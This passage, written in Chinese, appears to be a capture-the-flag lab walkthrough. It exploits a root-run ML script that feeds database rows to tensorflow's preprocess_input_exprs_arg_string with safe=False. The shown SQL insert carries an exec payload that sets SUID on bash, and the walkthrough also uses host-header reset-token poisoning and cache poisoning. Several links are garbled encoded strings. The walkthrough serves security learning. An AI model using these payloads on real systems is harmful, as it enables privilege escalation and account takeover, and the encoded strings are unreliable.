
``` 
cat /opt/security/ml_security.py
#!/usr/bin/python3
import sys
import csv
import pickle
import mysql.connector
import requests
import threading
import numpy as np
import pandas as pd
import urllib.parse as parse
from urllib.parse import unquote
from sklearn import model_selection
from nltk.tokenize import word_tokenize
from sklearn.linear_model import LogisticRegression
from gensim.models.doc2vec import Doc2Vec, TaggedDocument
from tensorflow.python.tools.saved_model_cli import preprocess_input_exprs_arg_string
np.random.seed(42)
f1 = '/opt/security/lib/DecisionTreeClassifier.sav'
f2 = '/opt/security/lib/SVC.sav'
f3 = '/opt/security/lib/GaussianNB.sav'
f4 = '/opt/security/lib/KNeighborsClassifier.sav'
f5 = '/opt/security/lib/RandomForestClassifier.sav'
f6 = '/opt/security/lib/MLPClassifier.sav'
# load the models from disk
loaded_model1 = pickle.load(open(f1, 'rb'))
loaded_model2 = pickle.load(open(f2, 'rb'))
loaded_model3 = pickle.load(open(f3, 'rb'))
loaded_model4 = pickle.load(open(f4, 'rb'))
loaded_model5 = pickle.load(open(f5, 'rb'))
loaded_model6 = pickle.load(open(f6, 'rb'))
model= Doc2Vec.load("/opt/security/lib/d2v.model")
# Create a function to convert an array of strings to a set of features
def getVec(text):
features = []
for i, line in enumerate(text):
test_data = word_tokenize(line.lower())
v1 = model.infer_vector(test_data)
featureVec = v1
lineDecode = unquote(line)
lowerStr = str(lineDecode).lower()
feature1 = int(lowerStr.count('link'))
feature1 += int(lowerStr.count('object'))
feature1 += int(lowerStr.count('form'))
feature1 += int(lowerStr.count('embed'))
feature1 += int(lowerStr.count('ilayer'))
feature1 += int(lowerStr.count('layer'))
feature1 += int(lowerStr.count('style'))
feature1 += int(lowerStr.count('applet'))
feature1 += int(lowerStr.count('meta'))
feature1 += int(lowerStr.count('img'))
feature1 += int(lowerStr.count('iframe'))
feature1 += int(lowerStr.count('marquee'))
# add feature for malicious method count
feature2 = int(lowerStr.count('exec'))
feature2 += int(lowerStr.count('fromcharcode'))
feature2 += int(lowerStr.count('eval'))
feature2 += int(lowerStr.count('alert'))
feature2 += int(lowerStr.count('getelementsbytagname'))
feature2 += int(lowerStr.count('write'))
feature2 += int(lowerStr.count('unescape'))
feature2 += int(lowerStr.count('escape'))
feature2 += int(lowerStr.count('prompt'))
feature2 += int(lowerStr.count('onload'))
feature2 += int(lowerStr.count('onclick'))
feature2 += int(lowerStr.count('onerror'))
feature2 += int(lowerStr.count('onpage'))
feature2 += int(lowerStr.count('confirm'))
# add feature for ".js" count
feature3 = int(lowerStr.count('.js'))
# add feature for "javascript" count
feature4 = int(lowerStr.count('javascript'))
# add feature for length of the string
feature5 = int(len(lowerStr))
# add feature for "<script" count
feature6 = int(lowerStr.count('script'))
feature6 += int(lowerStr.count('<script'))
feature6 += int(lowerStr.count('&lt;script'))
feature6 += int(lowerStr.count('%3cscript'))
feature6 += int(lowerStr.count('%3c%73%63%72%69%70%74'))
# add feature for special character count
feature7 = int(lowerStr.count('&'))
feature7 += int(lowerStr.count('<'))
feature7 += int(lowerStr.count('>'))
feature7 += int(lowerStr.count('"'))
feature7 += int(lowerStr.count('\''))
feature7 += int(lowerStr.count('/'))
feature7 += int(lowerStr.count('%'))
feature7 += int(lowerStr.count('\*'))
feature7 += int(lowerStr.count(';'))
feature7 += int(lowerStr.count('+'))
feature7 += int(lowerStr.count('='))
feature7 += int(lowerStr.count('%3C'))
# add feature for http count
feature8 = int(lowerStr.count('http'))
# append the features
featureVec = np.append(featureVec,feature1)
featureVec = np.append(featureVec,feature2)
featureVec = np.append(featureVec,feature3)
featureVec = np.append(featureVec,feature4)
featureVec = np.append(featureVec,feature5)
featureVec = np.append(featureVec,feature6)
featureVec = np.append(featureVec,feature7)
featureVec = np.append(featureVec,feature8)
features.append(featureVec)
return features
# Grab links
conn = mysql.connector.connect(host='localhost',database='app',user='diego',password='dCb#1!x0%gjq')
cursor = conn.cursor()
cursor.execute('select reason from escalate')
r = [i[0] for i in cursor.fetchall()]
conn.close()
data=[]
for i in r:
data.append(i)
Xnew = getVec(data)
#1 DecisionTreeClassifier
ynew1 = loaded_model1.predict(Xnew)
#2 SVC
ynew2 = loaded_model2.predict(Xnew)
#3 GaussianNB
ynew3 = loaded_model3.predict(Xnew)
#4 KNeighborsClassifier
ynew4 = loaded_model4.predict(Xnew)
#5 RandomForestClassifier
ynew5 = loaded_model5.predict(Xnew)
#6 MLPClassifier
ynew6 = loaded_model6.predict(Xnew)
# show the sample inputs and predicted outputs
def assessData(i):
score = ((.175*ynew1[i])+(.15*ynew2[i])+(.05*ynew3[i])+(.075*ynew4[i])+(.25*ynew5[i])+(.3*ynew6[i]))
if score >= .5:
try:
preprocess_input_exprs_arg_string(data[i],safe=False)
except:
pass
for i in range(len(Xnew)):
t = threading.Thread(target=assessData, args=(i,))
# t.daemon = True
t.start()
```

`/opt/security/ml_security.py`中使用了`tensorflow`

`tensorflow` `preprocess_input_exprs_arg_string`中存在代码注入

<mark class="encrypted">c50K9s2c8@1M7s2y4Q4x3@1q4Q4x3V1k6Q4x3V1k6Y4K9i4c8Z5N6h3u0Q4x3X3g2U0L8$3#2Q4x3V1k6S2k6s2k6A6M7$3!0J5K9h3g2K6i4K6u0r3c8@1S2e0b7g2)9J5k6o6M7#2j5K6W2Q4x3X3c8B7M7X3R3@1i4K6u0V1y4K6W2E0j5H3`.`.</mark>

强制函数执行一个语句，我们可以用来实现代码执行

`cursor.execute('select reason from escalate')`

![图片描述](upload/attach/202302/865065_R44HPKB6WG24M5Q.png)

我们可以使用恶意内容覆盖数据库，并运行脚本来执行我们的payload

![图片描述](upload/attach/202302/865065_BVH3EXGZ99MENKD.png)

```
insert into escalate values ("a","b","c",'hello=exec("""\nimport os\nos.system("chmod +s /usr/bin/bash")""")');
```

![图片描述](upload/attach/202302/865065_V734V6VEPUHEEDU.png)

获得root flag

靶机还是只开了22和80

扫目录得到

![图片描述](https://bbs.kanxue.com/upload/attach/202401/865065_EFW6247CSRY8Z36.png)

在登陆页面检查到<!-- Q1 release fix by robert-dev-142522 -->

`robert-dev-10320`

![图片描述](https://bbs.kanxue.com/upload/attach/202401/865065_6F6FK33EJEJD69K.png)

在 `e16K9s2c8@1M7q4)9K6b7g2)9J5c8W2)9J5c8U0p5H3i4K6u0W2x3e0m8Q4x3X3f1I4x3g2)9J5k6e0p5^5z5q4)9J5c8X3k6G2M7X3N6G2N6l9`.`. 页面输入会得到

![图片描述](https://bbs.kanxue.com/upload/attach/202401/865065_2D4CSAZFSHGNYPT.png)

使用bp拦截请求，将host改为本机，本机开启监听

![图片描述](https://bbs.kanxue.com/upload/attach/202401/865065_664XR5JPTZHBEC7.png)

可以拿到reset的token，使用token去重置密码

![图片描述](https://bbs.kanxue.com/upload/attach/202401/865065_48P24UH3WAK9NJG.png)

登陆后查看网页源码可以看到有指向`/escalate/admin_tickets`

![图片描述](https://bbs.kanxue.com/upload/attach/202401/865065_CGTEG48CTK6TB7A.png)

靶机在路径 `/static` 中有缓存中毒

在`56dK9s2c8@1M7q4)9K6b7g2)9J5c8W2)9J5c8U0p5H3i4K6u0W2x3e0m8Q4x3X3f1I4x3g2)9J5k6e0p5^5z5q4)9J5c8X3g2K6j5$3q4D9j5i4c8W2i4@1f1&6i4@1p5I4i4@1t1#2i4@1f1&6i4K6W2p5i4@1p5J5i4@1f1^5i4@1u0q4i4K6V1K6i4@1f1#2i4K6R3#2i4@1p5#2i4@1f1&6i4K6W2p5i4@1t1$3i4@1f1$3i4K6W2o6i4@1u0m8i4@1f1@1i4@1t1^5i4K6S2m8i4@1f1@1i4@1t1^5i4K6S2p5i4@1f1#2i4@1q4p5i4K6V1^5i4@1f1#2i4K6W2o6i4@1p5^5i4@1f1%4i4K6W2m8i4K6R3@1i4@1f1%4i4@1u0p5i4K6V1I4i4@1f1#2i4K6W2p5i4K6R3H3i4@1g2r3i4@1u0o6i4K6S2o6i4@1f1%4i4@1q4p5i4K6R3&6i4@1f1#2i4@1u0q4i4K6R3#2i4@1f1@1i4@1t1^5i4K6R3H3i4@1f1@1i4@1u0o6i4K6W2m8i4@1f1#2i4K6V1H3i4K6S2q4i4@1f1^5i4@1q4q4i4@1u0r3i4@1f1&6i4K6V1%4i4@1q4q4i4@1f1&6i4K6R3J5i4@1p5K6i4@1f1@1i4@1t1^5i4@1q4m8i4@1f1%4i4@1u0p5i4K6V1I4i4@1f1#2i4K6W2p5i4K6R3H3i4@1g2r3i4@1u0o6i4K6S2o6i4@1f1$3i4K6W2r3i4@1p5#2i4@1f1%4i4K6W2o6i4K6S2n7M7$3g2K6M7$3W2G2L8W2!0q4c8W2!0n7b7#2)9^5b7%4y4W2M7%4y4A6L8$3&6Q4c8e0g2Q4z5p5k6Q4z5e0S2Q4c8e0c8Q4b7U0S2Q4b7V1q4S2k6r3#2A6L8W2!0q4y4#2)9&6b7g2)9^5y4q4!0q4c8W2!0n7b7#2)9^5b7#2!0q4y4W2)9&6y4W2!0n7x3q4!0q4y4g2!0n7b7W2!0n7b7g2!0q4z5g2!0m8x3g2!0n7y4g2!0q4z5g2)9&6c8q4!0m8x3W2!0q4z5q4!0m8c8g2!0n7c8W2!0q4z5g2)9&6y4#2!0m8c8h3q4V1L8h3W2F1i4K6g2X3N6r3W2U0K9$3g2@1M7H3`.`.

![图片描述](https://bbs.kanxue.com/upload/attach/202302/865065_K92W8ZBGCZ7DKQ6.png)

![图片描述](https://bbs.kanxue.com/upload/attach/202302/865065_B9EZKUFS2EVZ6TS.png)
